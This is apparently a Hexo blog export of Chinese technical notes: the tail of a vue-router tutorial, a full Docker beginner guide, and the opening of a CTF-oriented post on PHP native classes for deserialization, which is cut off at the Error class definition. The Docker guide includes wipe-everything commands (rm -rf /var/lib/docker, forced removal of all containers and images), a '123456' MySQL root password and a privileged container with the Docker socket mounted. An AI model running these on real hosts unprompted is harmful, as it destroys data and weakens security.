+------------------+                  +-----------------+</code></pre>

<p>借助 <code>vue-router</code>，使用嵌套路由配置，就可以很简单地表达这种关系</p>
<pre class="language-none"><code class="language-none">const router &#x3D; new VueRouter(&#123;
  routes: [
    &#123;
      path: &#39;&#x2F;user&#x2F;:id&#39;,
      component: User,
      children: [
        &#123;
          &#x2F;&#x2F; 当 &#x2F;user&#x2F;:id&#x2F;profile 匹配成功，
          &#x2F;&#x2F; UserProfile 会被渲染在 User 的 &lt;router-view&gt; 中
          path: &#39;profile&#39;,
          component: UserProfile
        &#125;,
        &#123;
          &#x2F;&#x2F; 当 &#x2F;user&#x2F;:id&#x2F;posts 匹配成功
          &#x2F;&#x2F; UserPosts 会被渲染在 User 的 &lt;router-view&gt; 中
          path: &#39;posts&#39;,
          component: UserPosts
        &#125;
      ]
    &#125;
  ]
&#125;)</code></pre>

<h2 id="路由-编程式导航"><a href="#路由-编程式导航" class="headerlink" title="路由 - 编程式导航"></a>路由 - 编程式导航</h2><p>除了使用 <code>&lt;router-link&gt;</code> 创建 a 标签来定义导航链接，我们还可以借助 router 的实例方法，通过编写代码来实现</p>
<ol>
<li><code>router.push(location, onComplete?, onAbort?)</code></li>
</ol>
<p>在 Vue 实例内部，你可以通过 <code>$router</code> 访问路由实例，因此你可以调用 <code>this.$router.push()</code>，可以跳转到指定的页面。当你点击 <code>&lt;router-link&gt;</code> 时，这个方法会在内部调用，所以说，点击 <code>&lt;router-link :to=&quot;...&quot;&gt;</code> 等同于调用 <code>router.push(...)</code></p>
<p>该方法的参数可以是一个字符串路径，或者一个描述地址的对象。例如：</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F; 字符串
router.push(&#39;home&#39;)

&#x2F;&#x2F; 对象
router.push(&#123; path: &#39;home&#39; &#125;)

&#x2F;&#x2F; 命名的路由
router.push(&#123; name: &#39;user&#39;, params: &#123; userId: &#39;123&#39; &#125;&#125;)

&#x2F;&#x2F; 带查询参数，变成 &#x2F;register?plan&#x3D;private
router.push(&#123; path: &#39;register&#39;, query: &#123; plan: &#39;private&#39; &#125;&#125;)</code></pre>

<p><strong>注意：如果提供了 <code>path</code>，<code>params</code> 会被忽略，上述例子中的 <code>query</code> 并不属于这种情况。取而代之的是下面例子的做法，你需要提供路由的 <code>name</code> 或手写完整的带有参数的 <code>path</code>：</strong></p>
<pre class="language-none"><code class="language-none">const userId &#x3D; &#39;123&#39;
router.push(&#123; name: &#39;user&#39;, params: &#123; userId &#125;&#125;) &#x2F;&#x2F; -&gt; &#x2F;user&#x2F;123
router.push(&#123; path: &#96;&#x2F;user&#x2F;$&#123;userId&#125;&#96; &#125;) &#x2F;&#x2F; -&gt; &#x2F;user&#x2F;123
&#x2F;&#x2F; 这里的 params 不生效
router.push(&#123; path: &#39;&#x2F;user&#39;, params: &#123; userId &#125;&#125;) &#x2F;&#x2F; -&gt; &#x2F;user</code></pre>

<ol start="2">
<li><p><code>router.replace(location, onComplete?, onAbort?)</code></p>
<p>跟 <code>router.push</code> 很像，唯一的不同就是，它不会向 history 添加新记录，而是跟它的方法名一样 —— 替换掉当前的 history 记录</p>
</li>
<li><p><code>router.go(n)</code></p>
<p>这个方法的参数是一个整数，意思是在 history 记录中向前或者后退多少步，类似 <code>window.history.go(n)</code></p>
<p>例子</p>
<pre class="language-none"><code class="language-none">&#x2F;&#x2F; 在浏览器记录中前进一步，等同于 history.forward()
router.go(1)

&#x2F;&#x2F; 后退一步记录，等同于 history.back()
router.go(-1)

&#x2F;&#x2F; 前进 3 步记录
router.go(3)

&#x2F;&#x2F; 如果 history 记录不够用，那就默默地失败呗
router.go(-100)
router.go(100)</code></pre></li>
</ol>
<h2 id="路由-命名"><a href="#路由-命名" class="headerlink" title="路由 - 命名"></a>路由 - 命名</h2><p>有时候，通过一个名称来标识一个路由显得更方便一些，特别是在链接一个路由，或者是执行一些跳转的时候。你可以在创建 Router 实例的时候，在 <code>routes</code> 配置中给某个路由设置名称</p>
<pre class="language-none"><code class="language-none">const router &#x3D; new VueRouter(&#123;
  routes: [
    &#123;
      path: &#39;&#x2F;user&#x2F;:userId&#39;,
      name: &#39;user&#39;,
      component: User
    &#125;
  ]
&#125;)</code></pre>

<p>要链接到一个命名路由，可以给 <code>router-link</code> 的 <code>to</code> 属性传一个对象：</p>
<pre class="language-none"><code class="language-none">&lt;router-link :to&#x3D;&quot;&#123; name: &#39;user&#39;, params: &#123; userId: 123 &#125;&#125;&quot;&gt;User&lt;&#x2F;router-link&gt;</code></pre>

<p>这跟代码调用 <code>router.push()</code> 是一回事：</p>
<pre class="language-none"><code class="language-none">router.push(&#123; name: &#39;user&#39;, params: &#123; userId: 123 &#125; &#125;)</code></pre>

<p>这两种方式都会把路由导航到 <code>/user/123</code> 路径</p>
<h2 id="路由-重定向"><a href="#路由-重定向" class="headerlink" title="路由 - 重定向"></a>路由 - 重定向</h2><p>重定向也是通过 <code>routes</code> 配置来完成，下面例子是从 <code>/a</code> 重定向到 <code>/b</code>：</p>
<pre class="language-none"><code class="language-none">const router &#x3D; new VueRouter(&#123;
  routes: [
    &#123; path: &#39;&#x2F;a&#39;, redirect: &#39;&#x2F;b&#39; &#125;
  ]
&#125;)</code></pre>

<p>重定向的目标也可以是一个命名的路由：</p>
<pre class="language-none"><code class="language-none">const router &#x3D; new VueRouter(&#123;
  routes: [
    &#123; path: &#39;&#x2F;a&#39;, redirect: &#123; name: &#39;foo&#39; &#125;&#125;
  ]
&#125;)</code></pre>

<p>甚至是一个方法，动态返回重定向目标：</p>
<pre class="language-none"><code class="language-none">const router &#x3D; new VueRouter(&#123;
  routes: [
    &#123; path: &#39;&#x2F;a&#39;, redirect: to &#x3D;&gt; &#123;
      &#x2F;&#x2F; 方法接收 目标路由 作为参数
      &#x2F;&#x2F; return 重定向的 字符串路径&#x2F;路径对象
    &#125;&#125;
  ]
&#125;)</code></pre>

<h2 id="路由-别名"><a href="#路由-别名" class="headerlink" title="路由 - 别名"></a>路由 - 别名</h2><p>“重定向”的意思是，当用户访问 <code>/a</code>时，URL 将会被替换成 <code>/b</code>，然后匹配路由为 <code>/b</code>，那么“别名”又是什么呢</p>
<p><strong><code>/a</code> 的别名是 <code>/b</code>，意味着，当用户访问 <code>/b</code> 时，URL 会保持为 <code>/b</code>，但是路由匹配则为 <code>/a</code>，就像用户访问 <code>/a</code> 一样</strong></p>
<p>上面对应的路由配置为：</p>
<pre class="language-none"><code class="language-none">const router &#x3D; new VueRouter(&#123;
  routes: [
    &#123; path: &#39;&#x2F;a&#39;, component: A, alias: &#39;&#x2F;b&#39; &#125;
  ]
&#125;)</code></pre>

<p>“别名”的功能让你可以自由地将 UI 结构映射到任意的 URL，而不是受限于配置的嵌套路由结构</p>
<h2 id="路由-传参"><a href="#路由-传参" class="headerlink" title="路由 - 传参"></a>路由 - 传参</h2><p>在组件中使用 <code>$route</code> 会使之与其对应路由形成高度耦合，从而使组件只能在某些特定的 URL 上使用，限制了其灵活性</p>
<p>使用 <code>props</code> 将组件和路由解耦，如果 <code>props</code> 被设置为 <code>true</code>，<code>route.params</code> 将会被设置为组件属性：</p>
<p><strong>取代与 <code>$route</code> 的耦合</strong></p>
<pre class="language-none"><code class="language-none">const User &#x3D; &#123;
  template: &#39;&lt;div&gt;User &#123;&#123; $route.params.id &#125;&#125;&lt;&#x2F;div&gt;&#39;
&#125;
const router &#x3D; new VueRouter(&#123;
  routes: [&#123; path: &#39;&#x2F;user&#x2F;:id&#39;, component: User &#125;]
&#125;)</code></pre>

<p><strong>通过 <code>props</code> 解耦</strong></p>
<pre class="language-none"><code class="language-none">const User &#x3D; &#123;
  props: [&#39;id&#39;],
  template: &#39;&lt;div&gt;User &#123;&#123; id &#125;&#125;&lt;&#x2F;div&gt;&#39;
&#125;
const router &#x3D; new VueRouter(&#123;
  routes: [
    &#123; path: &#39;&#x2F;user&#x2F;:id&#39;, component: User, props: true &#125;,

    &#x2F;&#x2F; 对于包含命名视图的路由，你必须分别为每个命名视图添加 &#96;props&#96; 选项：
    &#123;
      path: &#39;&#x2F;user&#x2F;:id&#39;,
      components: &#123; default: User, sidebar: Sidebar &#125;,
      props: &#123; default: true, sidebar: false &#125;
    &#125;
  ]
&#125;)</code></pre>

<p>这样你便可以在任何地方使用该组件，使得该组件更易于重用和测试</p>
<p>如果 <code>props</code> 是一个<strong>对象</strong>，它会被按原样设置为组件属性。当 <code>props</code> 是静态的时候有用</p>
<pre class="language-none"><code class="language-none">const router &#x3D; new VueRouter(&#123;
  routes: [
    &#123;
      path: &#39;&#x2F;promotion&#x2F;from-newsletter&#39;,
      component: Promotion,
      props: &#123; newsletterPopup: false &#125;
    &#125;
  ]
&#125;)</code></pre>

<p>你可以创建一个<strong>函数</strong>返回 <code>props</code>。这样你便可以将参数转换成另一种类型，将静态值与基于路由的值结合等等</p>
<pre class="language-none"><code class="language-none">const router &#x3D; new VueRouter(&#123;
  routes: [
    &#123;
      path: &#39;&#x2F;search&#39;,
      component: SearchUser,
      props: route &#x3D;&gt; (&#123; query: route.query.q &#125;)
    &#125;
  ]
&#125;)</code></pre>

<p>URL <code>/search?q=vue</code> 会将 <code>&#123;query: &#39;vue&#39;&#125;</code> 作为属性传递给 <code>SearchUser</code> 组件</p>
<h2 id="路由-history"><a href="#路由-history" class="headerlink" title="路由 - history"></a>路由 - history</h2><p><code>vue-router</code> 默认 hash 模式 —— 使用 URL 的 hash 来模拟一个完整的 URL，于是当 URL 改变时，页面不会重新加载</p>
<p>如果不想要很丑的 hash，我们可以用路由的 <strong>history 模式</strong>，这种模式充分利用 <code>history.pushState</code> API 来完成 URL 跳转而无须重新加载页面</p>
<pre class="language-none"><code class="language-none">const router &#x3D; new VueRouter(&#123;
  mode: &#39;history&#39;,
  routes: [...]
&#125;)</code></pre>

<p>当你使用 history 模式时，URL 就像正常的 url，例如 <code>http://yoursite.com/user/id</code></p>
<p>不过这种模式要玩好，还需要后台配置支持。因为我们的应用是个单页客户端应用，如果后台没有正确的配置，当用户在浏览器直接访问 <code>http://oursite.com/user/id</code> 就会返回 404，这就不好看了</p>
<p>所以呢，你要在服务端增加一个覆盖所有情况的候选资源：如果 URL 匹配不到任何静态资源，则应该返回同一个 <code>index.html</code> 页面，这个页面就是你 app 依赖的页面</p>
]]></content>
      <categories>
        <category>前后端</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker从0到1</title>
    <url>/2022/04/13/Docker/</url>
    <content><![CDATA[<h1 id="Docker-介绍"><a href="#Docker-介绍" class="headerlink" title="Docker - 介绍"></a>Docker - 介绍</h1><blockquote>
<p><a href="https://docs.docker.com/">Docker</a> 是一个用_Go语言_实现的开源项目，可以让我们方便的创建和使用容器，docker将程序以及程序所有的依赖都打包到 docker container，这样你的程序可以在任何环境都会有一致的表现。</p>
<p>这里程序运行的依赖也就是容器就好比集装箱（相互独立），容器所处的操作系统环境就好比货船或港口，<strong>程序的表现只和集装箱有关系(容器)，和集装箱放在哪个货船或者哪个港口(操作系统)没有关系</strong>。</p>
</blockquote>
<p>因此我们可以看到 Docker 可以屏蔽环境差异，也就是说，只要你的程序打包到了 Docker 中，那么无论运行在什么环境下程序的行为都是一致的。</p>
<p>Docker从 17.03 版本之后分为 CE（Community Edition: 社区版） 和 EE（Enterprise Edition: 企业版），我们用社区版就可以了。</p>
<p>Docker 的优势就是<strong>快速部署</strong>，这是当前互联网公司最常见的一个应用场景，一个原因在于容器启动速度非常快，另一个原因在于只要确保一个容器中的程序正确运行，那么你就能确信无论在生产环境部署多少都能正确运行。</p>
<h1 id="Docker-组成"><a href="#Docker-组成" class="headerlink" title="Docker - 组成"></a>Docker - 组成</h1>

<h2 id="镜像（image）"><a href="#镜像（image）" class="headerlink" title="镜像（image）"></a>镜像（image）</h2><p>Docker 的镜像好比为一个_模板_，可以通过这个模板来创建容器服务，例如：Tomcat 镜像 &#x3D;&#x3D;&#x3D;&gt; run &#x3D;&#x3D;&gt; Tomcat1 容器（提供服务器），通过一个镜像可以创建很多容器。</p>
<h2 id="容器（container）"><a href="#容器（container）" class="headerlink" title="容器（container）"></a>容器（container）</h2><p>Docker 利用容器技术，独立运行一个或者一个组应用，通过镜像来创建的。</p>
<p>可以理解为一个简易的 linux 系统。</p>
<h2 id="仓库（repository）"><a href="#仓库（repository）" class="headerlink" title="仓库（repository）"></a>仓库（repository）</h2><p>仓库就是存放镜像的地方。</p>
<p>官方仓库：<a href="https://hub.docker.com/">Docker Hub</a></p>
<h1 id="Docker-安装"><a href="#Docker-安装" class="headerlink" title="Docker - 安装"></a>Docker - 安装</h1><p>在安装之前先检查系统版本是否符合<a href="https://docs.docker.com/engine/install/">官网文档</a>的要求。</p>


<ol>
<li><p>查看系统内核版本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">uname</span> -r</code></pre>


</li>
<li><p>查看系统配置</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /etc/os-release</code></pre>


</li>
<li><p>卸载旧版本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> remove <span class="token function">docker</span> docker-engine docker.io containerd runc</code></pre>
</li>
<li><p>更新<code>apt</code>包索引并安装包以允许<code>apt</code>通过 HTTPS 使用存储库</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> update
$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token punctuation">\</span>
    ca-certificates <span class="token punctuation">\</span>
    <span class="token function">curl</span> <span class="token punctuation">\</span>
    gnupg <span class="token punctuation">\</span>
    lsb-release</code></pre>
</li>
<li><p>添加官方的GPG秘钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">curl</span> -fsSL https://download.docker.com/linux/ubuntu/gpg <span class="token operator">|</span> <span class="token function">sudo</span> gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</code></pre>
</li>
<li><p>设置<strong>稳定</strong>存储库</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token punctuation">\</span>
  <span class="token string">"deb [arch=<span class="token variable"><span class="token variable">$(</span>dpkg --print-architecture<span class="token variable">)</span></span> signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
  <span class="token variable"><span class="token variable">$(</span>lsb_release -cs<span class="token variable">)</span></span> stable"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/docker.list <span class="token operator">></span> /dev/null</code></pre>
</li>
<li><p>安装 Docker 引擎</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> update
$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> docker-ce docker-ce-cli containerd.io</code></pre>
</li>
<li><p>测试</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 启动 docker</span>
$ systemctl start <span class="token function">docker</span>
<span class="token comment"># 查看当前版本号</span>
$ <span class="token function">docker</span> version</code></pre>

<p>出现版本号则表示安装成功。</p>
</li>
</ol>
<h1 id="Docker-卸载"><a href="#Docker-卸载" class="headerlink" title="Docker - 卸载"></a>Docker - 卸载</h1><ol>
<li><p>卸载依赖</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> remove <span class="token function">docker</span> docker-engine docker.io containerd runc</code></pre>
</li>
<li><p>卸载资源</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">rm</span> -rf /var/lib/docker</code></pre></li>
</ol>
<h1 id="Docker-容器运行流程"><a href="#Docker-容器运行流程" class="headerlink" title="Docker - 容器运行流程"></a>Docker - 容器运行流程</h1><p>当执行<code>docker run 容器名</code>命令时的运行流程：</p>


<h1 id="Docker-命令"><a href="#Docker-命令" class="headerlink" title="Docker - 命令"></a>Docker - 命令</h1><p>操作 Docker 的常用命令，可以参考<a href="https://docs.docker.com/engine/reference/commandline/docker/">官方文档</a></p>
<h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> version          <span class="token comment">#查看docker的版本信息</span>
$ <span class="token function">docker</span> info             <span class="token comment">#查看docker的系统信息,包括镜像和容器的数量</span>
$ <span class="token function">docker</span> 命令 --help       <span class="token comment">#帮助命令(可查看可选的参数)</span></code></pre>

<h2 id="查看本地主机的所有镜像"><a href="#查看本地主机的所有镜像" class="headerlink" title="查看本地主机的所有镜像"></a>查看本地主机的所有镜像</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> images		<span class="token comment"># 查看本地主机的所有镜像</span></code></pre>



<p><em>各字段含义</em></p>
<table>
<thead>
<tr>
<th align="center">字段</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">REPOSITORY</td>
<td align="center">镜像的仓库源</td>
</tr>
<tr>
<td align="center">TAG</td>
<td align="center">镜像的标签</td>
</tr>
<tr>
<td align="center">IMAGE ID</td>
<td align="center">镜像的id</td>
</tr>
<tr>
<td align="center">CREATED</td>
<td align="center">镜像的创建时间</td>
</tr>
<tr>
<td align="center">SIZE</td>
<td align="center">镜像的大小</td>
</tr>
</tbody></table>
<p><em>可选参数</em></p>
<p>-a&#x2F;–all 列出所有镜像</p>
<p>-q&#x2F;–quiet 只显示镜像的id</p>
<h2 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> search 关键字		<span class="token comment"># 搜索镜像</span></code></pre>



<p><em>可选参数</em></p>
<p>-f, –filter filter Filter output based on conditions provided<br>–format string Pretty-print search using a Go template<br>–limit int Max number of search results (default 25)<br>–no-trunc Don’t truncate output</p>
<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> pull 镜像名<span class="token punctuation">[</span>:tag<span class="token punctuation">]</span> 	<span class="token comment"># 下载镜像，未标注 tag 时默认为最新版本</span>

$ <span class="token function">docker</span> pull mysql:5.7		  <span class="token comment"># 下载 mysql 5.7</span></code></pre>



<h2 id="提交镜像"><a href="#提交镜像" class="headerlink" title="提交镜像"></a>提交镜像</h2><p>下载镜像版本，加入我们需要的内容，提交后就可以直接使用修改后的版本。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> commit -m<span class="token operator">=</span><span class="token string">"提交的信息"</span> -a<span class="token operator">=</span><span class="token string">"作者"</span> 容器id 目标镜像名:<span class="token punctuation">[</span>TAG<span class="token punctuation">]</span></code></pre>



<h2 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> rmi -f 镜像id （镜像id 镜像id      <span class="token comment"># 根据镜像id删除一个或多个镜像</span>
$ <span class="token function">docker</span> rmi -f <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> images -aq<span class="token variable">)</span></span>	 <span class="token comment"># 删除所有镜像</span></code></pre>



<h2 id="创建容器"><a href="#创建容器" class="headerlink" title="创建容器"></a>创建容器</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> pull centos 	<span class="token comment"># 拉取 centos 镜像</span>
$ <span class="token function">docker</span> run <span class="token punctuation">[</span>可选参数<span class="token punctuation">]</span> 镜像名 	<span class="token comment"># 创建并运行容器</span>

<span class="token comment"># 参数说明</span>
--name<span class="token operator">=</span><span class="token string">"名字"</span>          <span class="token comment"># 指定容器名字</span>
-d                    <span class="token comment"># 后台方式运行</span>
-it                   <span class="token comment"># 使用交互方式运行,进入容器查看内容</span>
-p                    <span class="token comment"># 指定容器的端口</span>
	-p ip:主机端口:容器端口		<span class="token comment"># 配置主机端口映射到容器端口</span>
	-p 主机端口:容器端口
	-p 容器端口
-P                    <span class="token comment"># 随机指定端口(大写的P)</span></code></pre>



<h2 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">exit</span> 		<span class="token comment"># 停止并退出当前容器</span></code></pre>

<p><code>Ctrl</code> + <code>P</code> + <code>Q</code>：退出但不停止当前容器</p>
<h2 id="历史容器"><a href="#历史容器" class="headerlink" title="历史容器"></a>历史容器</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> <span class="token function">ps</span> 	<span class="token comment"># 列出当前正在运行的容器</span>
-a   			<span class="token comment"># 列出所有容器的运行记录</span>
-n<span class="token operator">=</span>? 			<span class="token comment"># 显示最近创建的?个容器</span>
-q   			<span class="token comment"># 只显示容器的编号</span></code></pre>



<h2 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> <span class="token function">rm</span> 容器id 	<span class="token comment"># 根据容器id删除容器，不能删除正在运行的容器，强制删除加入 -f 参数</span>
$ <span class="token function">docker</span> <span class="token function">rm</span> -f <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> -aq<span class="token variable">)</span></span>   	<span class="token comment"># 删除所有的容器</span>
$ <span class="token function">docker</span> <span class="token function">ps</span> -a -q<span class="token operator">|</span><span class="token function">xargs</span> <span class="token function">docker</span> <span class="token function">rm</span> 	<span class="token comment"># 删除所有的容器</span></code></pre>

<h2 id="启动和停止容器"><a href="#启动和停止容器" class="headerlink" title="启动和停止容器"></a>启动和停止容器</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> start 容器id          <span class="token comment"># 启动容器</span>
$ <span class="token function">docker</span> restart 容器id        <span class="token comment"># 重启容器</span>
$ <span class="token function">docker</span> stop 容器id           <span class="token comment"># 停止当前运行的容器</span>
$ <span class="token function">docker</span> <span class="token function">kill</span> 容器id           <span class="token comment"># 强制停止当前容器</span></code></pre>

<h2 id="查看容器日志日志"><a href="#查看容器日志日志" class="headerlink" title="查看容器日志日志"></a>查看容器日志日志</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> logs -tf 容器id				<span class="token comment"># 动态显示容器完整日志</span>
$ <span class="token function">docker</span> logs --tail number 容器id 	<span class="token comment"># 显示最后number条日志</span></code></pre>



<h2 id="查看容器进程信息"><a href="#查看容器进程信息" class="headerlink" title="查看容器进程信息"></a>查看容器进程信息</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> <span class="token function">top</span> 容器id</code></pre>



<h2 id="查看容器元数据"><a href="#查看容器元数据" class="headerlink" title="查看容器元数据"></a>查看容器元数据</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> inspect 容器id</code></pre>



<h2 id="进入后台运行的容器"><a href="#进入后台运行的容器" class="headerlink" title="进入后台运行的容器"></a>进入后台运行的容器</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> <span class="token builtin class-name">exec</span> -it 容器id 终端		<span class="token comment"># 进入容器后开启一个新的终端</span>
$ <span class="token function">docker</span> attach 容器id			 <span class="token comment"># 进入容器正在运行的终端，不会启动新的进程</span></code></pre>

<h2 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> <span class="token function">cp</span> 容器id:容器内路径  目的主机路径		<span class="token comment"># 拷贝容器的文件到主机中</span>
$ <span class="token function">docker</span> <span class="token function">cp</span> 目的主机路径 容器id:容器内路径		<span class="token comment"># 拷贝宿主机的文件到容器中</span></code></pre>

<h1 id="Docker-实例"><a href="#Docker-实例" class="headerlink" title="Docker - 实例"></a>Docker - 实例</h1><p>关于端口暴露</p>


<ol>
<li><p>Nginx</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> search nginx
$ <span class="token function">docker</span> pull nginx
$ <span class="token function">docker</span> run -d --name nginx01 -p <span class="token number">1234</span>:80 nginx

	-d 后台运行
	--name 给容器命名
	-p <span class="token number">1234</span>:80 将宿主机的1234端口映射到该容器的80端口</code></pre>


</li>
<li><p>Tomcat</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> search tomcat
$ <span class="token function">docker</span> pull tomcat
$ <span class="token function">docker</span> run -d --name myTomcat -p <span class="token number">2234</span>:8080 tomcat

	-d 后台运行
	--name 给容器命名
	-p <span class="token number">2234</span>:80 将宿主机的2234端口映射到该容器的8080端口</code></pre>



<p>404 的原因是<code>webapps</code>无项目</p>


<p>初始项目在<code>webapps.dist</code>下，把整个目录复制到<code>webapps</code>下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cp</span> -r webapps.dist/* webapps</code></pre>


</li>
<li><p>MySQL</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> search mysql
$ <span class="token function">docker</span> pull mysql
$ <span class="token function">docker</span> run -d -p <span class="token number">3310</span>:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /home/mysql/data:/var/lib/mysql -e <span class="token assign-left variable">MYSQL_ROOT_PASSWORD</span><span class="token operator">=</span><span class="token number">123456</span> --name mysql01 mysql</code></pre>

<p>成功连接数据库</p>


<p>成功映射数据</p>


<p>映射后，即便容器被删数据依旧存在</p>
</li>
</ol>
<h1 id="Portaniner"><a href="#Portaniner" class="headerlink" title="Portaniner"></a>Portaniner</h1><p>Portaniner 是 Docker 的图形化管理工具，类似的工具还有 Rancher</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> run -d -p <span class="token number">3234</span>:9000 --name myPort --restart<span class="token operator">=</span>always -v /var/run/docker.sock:/var/run/docker.sock --privileged<span class="token operator">=</span>true portainer/portainer</code></pre>

<p>注册账号</p>


<p>选择本地</p>


<p>创建成功</p>


<h1 id="数据卷"><a href="#数据卷" class="headerlink" title="数据卷"></a>数据卷</h1><p>作用：<strong>把容器内的数据挂载到主机</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">docker</span> run -it -v 主机地址:容器地址 centos /bin/bash		<span class="token comment"># 将容器地址映射到主机</span>
$ <span class="token function">docker</span> inspect 容器id		<span class="token comment"># 查看映射情况</span></code></pre>

<p>映射成功</p>


<p>数据卷内容为<strong>双向绑定</strong>，不会占用双倍存储，可以参考C语言中指针的定义理解。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zhuanlan.zhihu.com/p/187505981">什么是Docker？看这一篇干货文章就够了！</a></p>
<p><a href="https://blog.csdn.net/huangjhai/article/details/118854733">Docker快速入门总结笔记</a></p>
]]></content>
      <categories>
        <category>前后端</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>环境</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP原生类</title>
    <url>/2022/04/30/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有时候会遇到一些反序列化，给出了反序列化函数，但是没有给出类，这种情况下就需要用到原生类。</p>
<p>之前做 CTF 题的时候就遇到了，一直拖到现在。。。。。。</p>
<p>先总结一部分遇到的，如果遇到新的再加。</p>
<h1 id="Error-x2F-Exception"><a href="#Error-x2F-Exception" class="headerlink" title="Error &#x2F; Exception"></a>Error &#x2F; Exception</h1><p>在特定的环境下利用内置的 <code>__toString()</code> 方法，可以自定义<code>$message</code>中的字符串。</p>
<h2 id="Error-类"><a href="#Error-类" class="headerlink" title="Error 类"></a>Error 类</h2><p><a href="https://www.php.net/manual/zh/class.error.php">Error</a> 是所有 PHP 内部错误类的基类，用于定义一个错误。</p>
<blockquote>
<p>适用于 PHP 7 &#x2F; 8 版本，且开启报错</p>
</blockquote>
<p>摘要：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Error</span> <span class="token keyword">implements</span> <span class="token class-name">Throwable</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">/* 属性 */</span>
	<span class="token keyword">protected</span> <span class="token keyword type-declaration">string</span> <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>					<span class="token comment"># 错误消息内容</span>
	<span class="token keyword">private</span> <span class="token keyword type-declaration">string</span> <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>					<span class="token comment"># 字符串形式的堆栈跟踪</span>
	<span class="token keyword">protected</span> <span class="token keyword type-declaration">int</span> <span class="token variable">$code</span><span class="token punctuation">;</span>							<span class="token comment"># 错误代码</span>
	<span class="token keyword">protected</span> <span class="token keyword type-declaration">string</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>					<span class="token comment"># 抛出错误的文件名</span>
	<span class="token keyword">protected</span> <span class="token keyword type-declaration">int</span> <span class="token variable">$line</span><span class="token punctuation">;</span>							<span class="token comment"># 抛出错误的行数</span>
